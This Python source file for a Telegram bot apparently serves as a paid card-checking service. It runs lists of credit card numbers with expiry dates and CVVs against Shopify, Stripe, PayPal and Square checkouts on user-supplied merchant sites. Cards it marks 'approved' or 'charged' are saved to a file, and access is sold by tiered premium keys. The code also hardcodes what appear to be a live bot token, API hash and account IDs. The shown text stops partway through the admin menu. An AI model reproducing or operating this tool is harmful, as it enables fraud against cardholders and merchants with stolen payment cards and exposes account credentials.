from telethon import TelegramClient, events, Button
from telethon.tl.types import KeyboardButtonCallback
import requests, random, datetime, json, os, re, asyncio, time
import string
import hashlib
import aiohttp
import aiofiles
from urllib.parse import urlparse

# --- Import the command handlers from their separate files ---
from st_commands import register_handlers as register_st_handlers
from pp_commands import register_handlers as register_pp_handlers
from py_commands import register_handlers as register_py_handlers
from sq_commands import register_handlers as register_sq_handlers
from chk_command import register_handlers as register_chk_handlers

# Config
API_ID = '27959876'
API_HASH = "75c673cee62f34b0f51a49b52a53e622"
BOT_TOKEN = "7207621774:AAF0DUHoXjJaYQeWpzSfhfbGt884Y9rAGjU"
ADMIN_ID = [7419721408]
GROUP_ID = '-1002523910071'

# Files
PREMIUM_FILE = "premium.json"
FREE_FILE = "free_users.json"
SITE_FILE = "user_sites.json"
KEYS_FILE = "keys.json"
CC_FILE = "cc.txt"
BANNED_FILE = "banned_users.json"

ACTIVE_MTXT_PROCESSES = {}

# --- Utility Functions ---

async def create_json_file(filename):
    try:
        if not os.path.exists(filename):
            async with aiofiles.open(filename, "w") as file:
                await file.write(json.dumps({}))
    except Exception as e:
        print(f"Error creating {filename}: {str(e)}")

async def initialize_files():
    for file in [PREMIUM_FILE, FREE_FILE, SITE_FILE, KEYS_FILE, BANNED_FILE]:
        await create_json_file(file)

async def load_json(filename):
    try:
        if not os.path.exists(filename):
            await create_json_file(filename)
        async with aiofiles.open(filename, "r") as f:
            content = await f.read()
            return json.loads(content) if content else {}
    except Exception as e:
        print(f"Error loading {filename}: {str(e)}")
        return {}

async def save_json(filename, data):
    try:
        async with aiofiles.open(filename, "w") as f:
            await f.write(json.dumps(data, indent=4))
    except Exception as e:
        print(f"Error saving {filename}: {str(e)}")

def generate_key():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))

async def is_premium_user(user_id):
    premium_users = await load_json(PREMIUM_FILE)
    user_data = premium_users.get(str(user_id))
    if not user_data: 
        return False
    expiry_date = datetime.datetime.fromisoformat(user_data['expiry'])
    current_date = datetime.datetime.now()
    if current_date > expiry_date:
        del premium_users[str(user_id)]
        await save_json(PREMIUM_FILE, premium_users)
        return False
    return True

async def add_premium_user(user_id, days):
    premium_users = await load_json(PREMIUM_FILE)
    expiry_date = datetime.datetime.now() + datetime.timedelta(days=days)
    premium_users[str(user_id)] = {
        'expiry': expiry_date.isoformat(),
        'added_by': 'admin',
        'days': days
    }
    await save_json(PREMIUM_FILE, premium_users)

async def remove_premium_user(user_id):
    premium_users = await load_json(PREMIUM_FILE)
    if str(user_id) in premium_users:
        del premium_users[str(user_id)]
        await save_json(PREMIUM_FILE, premium_users)
        return True
    return False

async def is_banned_user(user_id):
    banned_users = await load_json(BANNED_FILE)
    return str(user_id) in banned_users

async def ban_user(user_id, banned_by):
    banned_users = await load_json(BANNED_FILE)
    banned_users[str(user_id)] = {
        'banned_at': datetime.datetime.now().isoformat(),
        'banned_by': banned_by
    }
    await save_json(BANNED_FILE, banned_users)

async def unban_user(user_id):
    banned_users = await load_json(BANNED_FILE)
    if str(user_id) in banned_users:
        del banned_users[str(user_id)]
        await save_json(BANNED_FILE, banned_users)
        return True
    return False

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as res:
                if res.status != 200: 
                    return "𝙉/𝘼", "𝙉/𝘼", "𝙉/𝘼", "𝙉/𝘼", "𝙐𝙣𝙠𝙣𝙤𝙬𝙣", "🏳️"
                data = await res.json()
                brand = data.get('brand', '𝙉/𝘼')
                bin_type = data.get('type', '𝙉/𝘼')
                level = data.get('level', '𝙉/𝘼')
                bank = data.get('bank', '𝙉/𝘼')
                country = data.get('country_name', '𝙐𝙣𝙠𝙣𝙤𝙬𝙣')
                flag = data.get('country_flag', '🏳️')
                return brand, bin_type, level, bank, country, flag
    except Exception:
        return "𝙉/𝘼", "𝙉/𝘼", "𝙉/𝘼", "𝙉/𝘼", "𝙐𝙣𝙠𝙣𝙤𝙬𝙣", "🏳️"

def normalize_card(text):
    if not text: 
        return None
    text = text.replace('\n', ' ').replace('/', ' ')
    numbers = re.findall(r'\d+', text)
    cc = mm = yy = cvv = ''
    for part in numbers:
        if len(part) == 16 or len(part) == 15: 
            cc = part
        elif len(part) == 4 and part.startswith('20'): 
            yy = part[2:]
        elif len(part) == 2 and int(part) <= 12 and mm == '': 
            mm = part
        elif len(part) == 2 and not part.startswith('20') and yy == '': 
            yy = part
        elif len(part) in [3, 4] and cvv == '': 
            cvv = part
    if cc and mm and yy and cvv: 
        return f"{cc}|{mm}|{yy}|{cvv}"
    return None

def extract_json_from_response(response_text):
    if not response_text: 
        return None
    start_index = response_text.find('{')
    if start_index == -1: 
        return None
    brace_count = 0
    end_index = -1
    for i in range(start_index, len(response_text)):
        if response_text[i] == '{': 
            brace_count += 1
        elif response_text[i] == '}':
            brace_count -= 1
            if brace_count == 0:
                end_index = i
                break
    if end_index == -1: 
        return None
    json_text = response_text[start_index:end_index + 1]
    try: 
        return json.loads(json_text)
    except json.JSONDecodeError: 
        return None

async def check_card_random_site(card, sites):
    if not sites: 
        return {"Response": "ERROR", "Price": "-", "Gateway": "-"}, -1
    selected_site = random.choice(sites)
    site_index = sites.index(selected_site) + 1
    try:
        url = f"your site/withoutproxy.php?cc={card}&site={selected_site}"
        timeout = aiohttp.ClientTimeout(total=90)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as res:
                if res.status != 200: 
                    return {"Response": f"HTTP_ERROR_{res.status}", "Price": "-", "Gateway": "-"}, site_index
                response_text = await res.text()
                json_data = extract_json_from_response(response_text)
                if json_data: 
                    return json_data, site_index
                else: 
                    return {"Response": "INVALID_JSON", "Price": "-", "Gateway": "-"}, site_index
    except Exception as e: 
        return {"Response": str(e), "Price": "-", "Gateway": "-"}, site_index

async def check_card_specific_site(card, site):
    try:
        url = f"your site/withoutproxy.php?cc={card}&site={site}"
        timeout = aiohttp.ClientTimeout(total=90)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as res:
                if res.status != 200: 
                    return {"Response": f"HTTP_ERROR_{res.status}", "Price": "-", "Gateway": "-"}
                response_text = await res.text()
                json_data = extract_json_from_response(response_text)
                if json_data: 
                    return json_data
                else: 
                    return {"Response": "INVALID_JSON", "Price": "-", "Gateway": "-"}
    except Exception as e: 
        return {"Response": str(e), "Price": "-", "Gateway": "-"}

def extract_card(text):
    match = re.search(r'(\d{12,16})[|\s/]*(\d{1,2})[|\s/]*(\d{2,4})[|\s/]*(\d{3,4})', text)
    if match:
        cc, mm, yy, cvv = match.groups()
        if len(yy) == 4: 
            yy = yy[2:]
        return f"{cc}|{mm}|{yy}|{cvv}"
    return normalize_card(text)

def extract_all_cards(text):
    cards = set()
    for line in text.splitlines():
        card = extract_card(line)
        if card: 
            cards.add(card)
    return list(cards)

async def can_use(user_id, chat):
    if await is_banned_user(user_id):
        return False, "banned"

    is_premium = await is_premium_user(user_id)
    is_private = chat.id == user_id

    if is_private:
        if is_premium:
            return True, "premium_private"
        else:
            return False, "no_access"
    else:
        if is_premium:
            return True, "premium_group"
        else:
            return True, "group_free"

def get_cc_limit(access_type, user_id=None):
    if user_id and user_id in ADMIN_ID:
        return 999999
    if access_type in ["premium_private", "premium_group"]:
        return 200
    elif access_type == "group_free":
        return 50
    return 0

async def save_approved_card(card, status, response, gateway, price):
    try:
        async with aiofiles.open(CC_FILE, "a", encoding="utf-8") as f:
            await f.write(f"{card} | {status} | {response} | {gateway} | {price} | {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
    except Exception as e: 
        print(f"Error saving card to {CC_FILE}: {str(e)}")

async def pin_charged_message(event, message):
    try:
        if event.is_group: 
            await message.pin()
    except Exception as e: 
        print(f"Failed to pin message: {e}")

def is_valid_url_or_domain(url):
    domain = url.lower()
    if domain.startswith(('http://', 'https://')):
        try: 
            parsed = urlparse(url)
        except: 
            return False
        domain = parsed.netloc
    domain_pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$'
    return bool(re.match(domain_pattern, domain))

def extract_urls_from_text(text):
    clean_urls = set()
    lines = text.split('\n')
    for line in lines:
        cleaned_line = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line.strip()).split(' ')[0]
        if cleaned_line and is_valid_url_or_domain(cleaned_line): 
            clean_urls.add(cleaned_line)
    return list(clean_urls)

def is_site_dead(response_text):
    if not response_text: 
        return True
    response_lower = response_text.lower()
    dead_indicators = [
        "receipt id is empty", "handle is empty", "product id is empty", "tax amount is empty",
        "payment method identifier is empty", "invalid url", "error in 1st req", "error in 1 req", 
        "cloudflare", "failed", "connection failed", "timed out", "access denied", "tlsv1 alert", 
        "ssl routines", "could not resolve", "domain name not found", "name or service not known",
        "openssl ssl_connect", "empty reply from server", "HTTP_ERROR_504", "http error", 
        "http_error_504", "bad gateway", "internal server error", "timeout"
    ]
    return any(indicator in response_lower for indicator in dead_indicators)

async def test_single_site(site, test_card="4031630422575208|01|2030|280"):
    try:
        url = f"your site/withoutproxy.php?cc={test_card}&site={site}"
        timeout = aiohttp.ClientTimeout(total=90)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as res:
                if res.status != 200: 
                    return {"status": "dead", "response": f"HTTP {res.status}", "site": site, "price": "-"}
                response_text = await res.text()
                json_data = extract_json_from_response(response_text)
                if not json_data: 
                    return {"status": "dead", "response": "Invalid JSON", "site": site, "price": "-"}
                response_msg = json_data.get("Response", "")
                price = json_data.get("Price", "-")
                if is_site_dead(response_msg): 
                    return {"status": "dead", "response": response_msg, "site": site, "price": price}
                else: 
                    return {"status": "working", "response": response_msg, "site": site, "price": price}
    except Exception as e: 
        return {"status": "dead", "response": str(e), "site": site, "price": "-"}

client = TelegramClient('cc_bot', API_ID, API_HASH)

# ==================== UI CONSTANTS ====================

SYMBOLS = {
    'box_tl': '╔', 'box_tr': '╗', 'box_bl': '╚', 'box_br': '╝',
    'box_h': '═', 'box_v': '║', 'box_sep': '├', 'box_sep_end': '╰',
    'arrow': '→', 'bullet': '•', 'dot': '●', 'circle': '○',
    'star': '★', 'line': '━', 'double_line': '═'
}

def create_header(title, icon="📌"):
    """Create a formatted header box"""
    title_text = f" {icon} {title} "
    padding = 30 - len(title_text)
    left_pad = padding // 2
    right_pad = padding - left_pad
    return f"{SYMBOLS['box_tl']}{SYMBOLS['box_h'] * left_pad}{title_text}{SYMBOLS['box_h'] * right_pad}{SYMBOLS['box_tr']}"

def create_footer():
    """Create a formatted footer"""
    return f"{SYMBOLS['box_bl']}{SYMBOLS['box_h'] * 30}{SYMBOLS['box_br']}"

def create_section(title, icon="📊"):
    """Create a section header"""
    return f"\n{icon} **{title}**\n{SYMBOLS['line'] * 20}"

def create_menu_button(text, emoji, command):
    """Create a menu button display"""
    return f"{emoji} `{command}` {SYMBOLS['arrow']} {text}"

def progress_bar(current, total, length=10):
    """Create a visual progress bar"""
    filled = int((current / total) * length)
    bar = "█" * filled + "░" * (length - filled)
    return f"[{bar}] {current}/{total}"

def format_status(status):
    """Format status with appropriate emoji"""
    status_map = {
        'approved': '✅ 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃',
        'charged': '💎 𝐂𝐇𝐀𝐑𝐆𝐄𝐃',
        'declined': '❌ 𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃',
        'error': '⚠️ 𝐄𝐑𝐑𝐎𝐑',
        'processing': '🔄 𝐏𝐑𝐎𝐂𝐄𝐒𝐒𝐈𝐍𝐆',
        'waiting': '⏳ 𝐖𝐀𝐈𝐓𝐈𝐍𝐆'
    }
    return status_map.get(status.lower(), status)

# ==================== MESSAGE TEMPLATES ====================

def banned_user_message():
    return f"""{create_header('𝐀𝐂𝐂𝐄𝐒𝐒 𝐁𝐋𝐎𝐂𝐊𝐄𝐃', '🚫')}
{SYMBOLS['box_v']}
{SYMBOLS['box_v']} 🚫 **𝐘𝐎𝐔 𝐇𝐀𝐕𝐄 𝐁𝐄𝐄𝐍 𝐁𝐀𝐍𝐍𝐄𝐃**
{SYMBOLS['box_v']}
{SYMBOLS['box_v']} 𝐓𝐡𝐢𝐬 𝐚𝐜𝐭𝐢𝐨𝐧 𝐢𝐬 𝐩𝐞𝐫𝐦𝐚𝐧𝐞𝐧𝐭.
{SYMBOLS['box_v']}
{SYMBOLS['box_v']} 𝐅𝐨𝐫 𝐚𝐩𝐩𝐞𝐚𝐥: @DekuCHK
{create_footer()}"""

def access_denied_message_with_button():
    message = f"""{create_header('𝐏𝐑𝐈𝐕𝐀𝐓𝐄 𝐀𝐂𝐂𝐄𝐒𝐒', '🔒')}
{SYMBOLS['box_v']}
{SYMBOLS['box_v']} 🔒 **𝐏𝐑𝐈𝐕𝐀𝐓𝐄 𝐀𝐂𝐂𝐄𝐒𝐒 𝐎𝐍𝐋𝐘**
{SYMBOLS['box_v']}
{SYMBOLS['box_v']} 𝐔𝐬𝐞 𝐢𝐧 𝐠𝐫𝐨𝐮𝐩 𝐟𝐨𝐫 𝐟𝐫𝐞𝐞 𝐚𝐜𝐜𝐞𝐬𝐬:
{create_footer()}"""
    buttons = [[Button.url("🚀 𝐉𝐎𝐈𝐍 𝐆𝐑𝐎𝐔𝐏", "https://t.me/+VI845oiGrL4xMzE0")]]
    return message, buttons

# ==================== BOT COMMAND HANDLERS ====================

@client.on(events.NewMessage(pattern=r'(?i)^[/.](start|help|menu|cmds?)$'))
async def start(event):
    _, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": 
        return await event.reply(banned_user_message())

    user_info = await event.get_sender()
    first_name = user_info.first_name or "𝐔𝐬𝐞𝐫"
    
    premium_status = "💎 𝐏𝐑𝐄𝐌𝐈𝐔𝐌" if access_type in ["premium_private", "premium_group"] else "🆓 𝐅𝐑𝐄𝐄"
    cc_limit = get_cc_limit(access_type, event.sender_id)
    
    welcome_msg = f"""{create_header('𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔', '🏠')}
{SYMBOLS['box_v']} 👋 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐛𝐚𝐜𝐤, **{first_name.upper()}**!
{create_section('𝐘𝐎𝐔𝐑 𝐒𝐓𝐀𝐓𝐔𝐒', '📊')}
{SYMBOLS['bullet']} 𝐀𝐜𝐜𝐞𝐬𝐬: {premium_status}
{SYMBOLS['bullet']} 𝐋𝐢𝐦𝐢𝐭: `{cc_limit}` 𝐂𝐂𝐬
{SYMBOLS['bullet']} 𝐔𝐈𝐃: `{event.sender_id}`

{create_section('𝐏𝐀𝐘𝐌𝐄𝐍𝐓 𝐆𝐀𝐓𝐄𝐖𝐀𝐘𝐒', '💳')}
{SYMBOLS['bullet']} 💳 **𝐒𝐇𝐎𝐏𝐈𝐅𝐘** → `/sh`, `/msh`, `/mtxt`
{SYMBOLS['bullet']} ⚡ **𝐒𝐓𝐑𝐈𝐏𝐄** → `/st`, `/mst`, `/mstxt`
{SYMBOLS['bullet']} 💰 **𝐏𝐀𝐘𝐏𝐀𝐋 $𝟑** → `/pp`, `/mpp`, `/mptxt`
{SYMBOLS['bullet']} 💸 **𝐏𝐀𝐘𝐏𝐀𝐋 $𝟎.𝟎𝟏** → `/py`, `/mpy`, `/mpytxt`
{SYMBOLS['bullet']} 🛡️ **𝐒𝐐𝐔𝐀𝐑𝐄** → `/sq`, `/msq`, `/msqtxt`
{SYMBOLS['bullet']} 🔍 **𝐂𝐇𝐄𝐂𝐊𝐄𝐑** → `/chk`, `/mchk`, `/chktxt`

{create_section('𝐌𝐀𝐍𝐀𝐆𝐄𝐌𝐄𝐍𝐓', '⚙️')}
{SYMBOLS['bullet']} 🌐 **𝐒𝐢𝐭𝐞𝐬** → `/add`, `/rm`, `/check`
{SYMBOLS['bullet']} 👤 **𝐏𝐫𝐨𝐟𝐢𝐥𝐞** → `/info`
{SYMBOLS['bullet']} 🔑 **𝐊𝐞𝐲𝐬** → `/redeem`

{create_footer()}
📅 `{datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}`"""

    # Create button grid for quick access
    buttons = [
        [Button.inline("💳 𝐒𝐇𝐎𝐏𝐈𝐅𝐘", b"menu_sh"), Button.inline("⚡ 𝐒𝐓𝐑𝐈𝐏𝐄", b"menu_st")],
        [Button.inline("💰 𝐏𝐀𝐘𝐏𝐀𝐋 $3", b"menu_pp"), Button.inline("💸 𝐏𝐀𝐘𝐏𝐀𝐋 $0.01", b"menu_py")],
        [Button.inline("🛡️ 𝐒𝐐𝐔𝐀𝐑𝐄", b"menu_sq"), Button.inline("🔍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑", b"menu_chk")],
        [Button.inline("🌐 𝐒𝐈𝐓𝐄𝐒", b"menu_sites"), Button.inline("👤 𝐏𝐑𝐎𝐅𝐈𝐋𝐄", b"menu_profile")]
    ]
    
    if event.sender_id in ADMIN_ID:
        buttons.append([Button.inline("⚙️ 𝐀𝐃𝐌𝐈𝐍 𝐏𝐀𝐍𝐄𝐋", b"menu_admin")])

    await event.reply(welcome_msg, buttons=buttons)

# ==================== MENU CALLBACKS ====================

@client.on(events.CallbackQuery(pattern=b"menu_sh"))
async def menu_sh(event):
    text = f"""{create_header('𝐒𝐇𝐎𝐏𝐈𝐅𝐘 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒', '💳')}
{create_section('𝐒𝐈𝐍𝐆𝐋𝐄 𝐂𝐇𝐄𝐂𝐊', '📌')}
{SYMBOLS['bullet']} `/sh CC|MM|YY|CVV`
{SYMBOLS['bullet']} 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚 𝐦𝐞𝐬𝐬𝐚𝐠𝐞

{create_section('𝐌𝐔𝐋𝐓𝐈 𝐂𝐇𝐄𝐂𝐊', '📌')}
{SYMBOLS['bullet']} `/msh` 𝐟𝐨𝐥𝐥𝐨𝐰𝐞𝐝 𝐛𝐲 𝐂𝐂𝐬
{SYMBOLS['bullet']} 𝐌𝐚𝐱 𝟐𝟎 𝐂𝐂𝐬

{create_section('𝐅𝐈𝐋𝐄 𝐂𝐇𝐄𝐂𝐊', '📌')}
{SYMBOLS['bullet']} `/mtxt` 𝐫𝐞𝐩𝐥𝐲 𝐭𝐨 .𝐭𝐱𝐭 𝐟𝐢𝐥𝐞

{create_footer()}"""
    await event.edit(text)

@client.on(events.CallbackQuery(pattern=b"menu_st"))
async def menu_st(event):
    text = f"""{create_header('𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒', '⚡')}
{create_section('𝐒𝐈𝐍𝐆𝐋𝐄 𝐂𝐇𝐄𝐂𝐊', '📌')}
{SYMBOLS['bullet']} `/st CC|MM|YY|CVV`
{SYMBOLS['bullet']} 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚 𝐦𝐞𝐬𝐬𝐚𝐠𝐞

{create_section('𝐌𝐔𝐋𝐓𝐈 𝐂𝐇𝐄𝐂𝐊', '📌')}
{SYMBOLS['bullet']} `/mst` 𝐟𝐨𝐥𝐥𝐨𝐰𝐞𝐝 𝐛𝐲 𝐂𝐂𝐬
{SYMBOLS['bullet']} 𝐌𝐚𝐱 𝟐𝟎 𝐂𝐂𝐬

{create_section('𝐅𝐈𝐋𝐄 𝐂𝐇𝐄𝐂𝐊', '📌')}
{SYMBOLS['bullet']} `/mstxt` 𝐫𝐞𝐩𝐥𝐲 𝐭𝐨 .𝐭𝐱𝐭 𝐟𝐢𝐥𝐞

{create_footer()}"""
    await event.edit(text)

@client.on(events.CallbackQuery(pattern=b"menu_pp"))
async def menu_pp(event):
    text = f"""{create_header('𝐏𝐀𝐘𝐏𝐀𝐋 $𝟑 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒', '💰')}
{create_section('𝐒𝐈𝐍𝐆𝐋𝐄 𝐂𝐇𝐄𝐂𝐊', '📌')}
{SYMBOLS['bullet']} `/pp CC|MM|YY|CVV`
{SYMBOLS['bullet']} 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚 𝐦𝐞𝐬𝐬𝐚𝐠𝐞

{create_section('𝐌𝐔𝐋𝐓𝐈 𝐂𝐇𝐄𝐂𝐊', '📌')}
{SYMBOLS['bullet']} `/mpp` 𝐟𝐨𝐥𝐥𝐨𝐰𝐞𝐝 𝐛𝐲 𝐂𝐂𝐬
{SYMBOLS['bullet']} 𝐌𝐚𝐱 𝟐𝟎 𝐂𝐂𝐬

{create_section('𝐅𝐈𝐋𝐄 𝐂𝐇𝐄𝐂𝐊', '📌')}
{SYMBOLS['bullet']} `/mptxt` 𝐫𝐞𝐩𝐥𝐲 𝐭𝐨 .𝐭𝐱𝐭 𝐟𝐢𝐥𝐞

{create_footer()}"""
    await event.edit(text)

@client.on(events.CallbackQuery(pattern=b"menu_py"))
async def menu_py(event):
    text = f"""{create_header('𝐏𝐀𝐘𝐏𝐀𝐋 $𝟎.𝟎𝟏 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒', '💸')}
{create_section('𝐒𝐈𝐍𝐆𝐋𝐄 𝐂𝐇𝐄𝐂𝐊', '📌')}
{SYMBOLS['bullet']} `/py CC|MM|YY|CVV`
{SYMBOLS['bullet']} 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚 𝐦𝐞𝐬𝐬𝐚𝐠𝐞

{create_section('𝐌𝐔𝐋𝐓𝐈 𝐂𝐇𝐄𝐂𝐊', '📌')}
{SYMBOLS['bullet']} `/mpy` 𝐟𝐨𝐥𝐥𝐨𝐰𝐞𝐝 𝐛𝐲 𝐂𝐂𝐬
{SYMBOLS['bullet']} 𝐌𝐚𝐱 𝟐𝟎 𝐂𝐂𝐬

{create_section('𝐅𝐈𝐋𝐄 𝐂𝐇𝐄𝐂𝐊', '📌')}
{SYMBOLS['bullet']} `/mpytxt` 𝐫𝐞𝐩𝐥𝐲 𝐭𝐨 .𝐭𝐱𝐭 𝐟𝐢𝐥𝐞

{create_footer()}"""
    await event.edit(text)

@client.on(events.CallbackQuery(pattern=b"menu_sq"))
async def menu_sq(event):
    text = f"""{create_header('𝐒𝐐𝐔𝐀𝐑𝐄 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒', '🛡️')}
{create_section('𝐒𝐈𝐍𝐆𝐋𝐄 𝐂𝐇𝐄𝐂𝐊', '📌')}
{SYMBOLS['bullet']} `/sq CC|MM|YY|CVV`
{SYMBOLS['bullet']} 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚 𝐦𝐞𝐬𝐬𝐚𝐠𝐞

{create_section('𝐌𝐔𝐋𝐓𝐈 𝐂𝐇𝐄𝐂𝐊', '📌')}
{SYMBOLS['bullet']} `/msq` 𝐟𝐨𝐥𝐥𝐨𝐰𝐞𝐝 𝐛𝐲 𝐂𝐂𝐬
{SYMBOLS['bullet']} 𝐌𝐚𝐱 𝟐𝟎 𝐂𝐂𝐬

{create_section('𝐅𝐈𝐋𝐄 𝐂𝐇𝐄𝐂𝐊', '📌')}
{SYMBOLS['bullet']} `/msqtxt` 𝐫𝐞𝐩𝐥𝐲 𝐭𝐨 .𝐭𝐱𝐭 𝐟𝐢𝐥𝐞

{create_footer()}"""
    await event.edit(text)

@client.on(events.CallbackQuery(pattern=b"menu_chk"))
async def menu_chk(event):
    text = f"""{create_header('𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒', '🔍')}
{create_section('𝐒𝐈𝐍𝐆𝐋𝐄 𝐂𝐇𝐄𝐂𝐊', '📌')}
{SYMBOLS['bullet']} `/chk CC|MM|YY|CVV`
{SYMBOLS['bullet']} 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚 𝐦𝐞𝐬𝐬𝐚𝐠𝐞

{create_section('𝐌𝐔𝐋𝐓𝐈 𝐂𝐇𝐄𝐂𝐊', '📌')}
{SYMBOLS['bullet']} `/mchk` 𝐟𝐨𝐥𝐥𝐨𝐰𝐞𝐝 𝐛𝐲 𝐂𝐂𝐬
{SYMBOLS['bullet']} 𝐌𝐚𝐱 𝟐𝟎 𝐂𝐂𝐬

{create_section('𝐅𝐈𝐋𝐄 𝐂𝐇𝐄𝐂𝐊', '📌')}
{SYMBOLS['bullet']} `/chktxt` 𝐫𝐞𝐩𝐥𝐲 𝐭𝐨 .𝐭𝐱𝐭 𝐟𝐢𝐥𝐞

{create_footer()}"""
    await event.edit(text)

@client.on(events.CallbackQuery(pattern=b"menu_sites"))
async def menu_sites(event):
    user_id = event.sender_id
    sites_data = await load_json(SITE_FILE)
    user_sites = sites_data.get(str(user_id), [])
    
    site_count = len(user_sites)
    
    text = f"""{create_header('𝐒𝐈𝐓𝐄 𝐌𝐀𝐍𝐀𝐆𝐄𝐌𝐄𝐍𝐓', '🌐')}
{create_section('𝐒𝐓𝐀𝐓𝐈𝐒𝐓𝐈𝐂𝐒', '📊')}
{SYMBOLS['bullet']} 𝐓𝐨𝐭𝐚𝐥 𝐬𝐢𝐭𝐞𝐬: `{site_count}`
{SYMBOLS['bullet']} 𝐋𝐢𝐦𝐢𝐭: `𝐔𝐧𝐥𝐢𝐦𝐢𝐭𝐞𝐝`

{create_section('𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒', '📌')}
{SYMBOLS['bullet']} `/add site.com` {SYMBOLS['arrow']} 𝐀𝐝𝐝 𝐬𝐢𝐭𝐞
{SYMBOLS['bullet']} `/rm site.com` {SYMBOLS['arrow']} 𝐑𝐞𝐦𝐨𝐯𝐞 𝐬𝐢𝐭𝐞
{SYMBOLS['bullet']} `/check` {SYMBOLS['arrow']} 𝐓𝐞𝐬𝐭 𝐬𝐢𝐭𝐞𝐬"""
    
    if user_sites:
        text += f"\n\n{create_section('𝐘𝐎𝐔𝐑 𝐒𝐈𝐓𝐄𝐒', '📋')}"
        for idx, site in enumerate(user_sites[:8], 1):
            text += f"\n{SYMBOLS['bullet']} `{site[:35]}...`" if len(site) > 35 else f"\n{SYMBOLS['bullet']} `{site}`"
        if len(user_sites) > 8:
            text += f"\n{SYMBOLS['bullet']} ... 𝐚𝐧𝐝 {len(user_sites)-8} 𝐦𝐨𝐫𝐞"
    
    text += f"\n\n{create_footer()}"
    
    buttons = [[Button.inline("🔍 𝐂𝐇𝐄𝐂𝐊 𝐌𝐘 𝐒𝐈𝐓𝐄𝐒", b"check_db_sites")]]
    await event.edit(text, buttons=buttons)

@client.on(events.CallbackQuery(pattern=b"menu_profile"))
async def menu_profile(event):
    user = await event.get_sender()
    user_id = event.sender_id
    
    is_premium = await is_premium_user(user_id)
    is_banned = await is_banned_user(user_id)
    
    sites_data = await load_json(SITE_FILE)
    site_count = len(sites_data.get(str(user_id), []))
    
    if is_premium:
        premium_data = await load_json(PREMIUM_FILE)
        expiry = premium_data.get(str(user_id), {}).get('expiry', '𝐍/𝐀')
        if expiry != '𝐍/𝐀':
            expiry_date = datetime.datetime.fromisoformat(expiry)
            days_left = (expiry_date - datetime.datetime.now()).days
            premium_text = f"💎 {days_left} 𝐝𝐚𝐲𝐬"
        else:
            premium_text = "💎 𝐀𝐜𝐭𝐢𝐯𝐞"
    else:
        premium_text = "🆓 𝐅𝐫𝐞𝐞"
    
    ban_text = "🚫 𝐁𝐚𝐧𝐧𝐞𝐝" if is_banned else "✅ 𝐂𝐥𝐞𝐚𝐧"
    
    join_date = user.date.strftime('%Y-%m-%d') if hasattr(user, 'date') else '𝐍/𝐀'
    
    text = f"""{create_header('𝐔𝐒𝐄𝐑 𝐏𝐑𝐎𝐅𝐈𝐋𝐄', '👤')}
{create_section('𝐏𝐄𝐑𝐒𝐎𝐍𝐀𝐋', '👤')}
{SYMBOLS['bullet']} 𝐍𝐚𝐦𝐞: **{user.first_name or '𝐍/𝐀'} {user.last_name or ''}**
{SYMBOLS['bullet']} 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: **@{user.username if user.username else '𝐍/𝐀'}**
{SYMBOLS['bullet']} 𝐔𝐈𝐃: `{user_id}`
{SYMBOLS['bullet']} 𝐉𝐨𝐢𝐧𝐞𝐝: `{join_date}`

{create_section('𝐒𝐓𝐀𝐓𝐔𝐒', '📊')}
{SYMBOLS['bullet']} 𝐀𝐜𝐜𝐞𝐬𝐬: {premium_text}
{SYMBOLS['bullet']} 𝐁𝐚𝐧: {ban_text}
{SYMBOLS['bullet']} 𝐒𝐢𝐭𝐞𝐬: `{site_count}`
{SYMBOLS['bullet']} 𝐋𝐢𝐦𝐢𝐭: `{get_cc_limit('premium_private' if is_premium else 'group_free', user_id)}` 𝐂𝐂𝐬

{create_footer()}"""
    await event.edit(text)

@client.on(events.CallbackQuery(pattern=b"menu_admin"))
async def menu_admin(event):
    if event.sender_id not in ADMIN_ID:
        return await event.answer("🚫 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝", alert=True)
    
    text = f"""{create_header('𝐀𝐃𝐌𝐈𝐍 𝐂𝐎𝐍𝐓𝐑𝐎𝐋 𝐏𝐀𝐍𝐄𝐋', '⚙️')}
{create_section('𝐔𝐒𝐄𝐑 𝐌𝐀𝐍𝐀𝐆𝐄𝐌𝐄𝐍𝐓', '👥')}
{SYMBOLS['bullet']} `/auth UID DAYS` {SYMBOLS['arrow']} 𝐀𝐝𝐝 𝐩𝐫𝐞𝐦𝐢𝐮𝐦
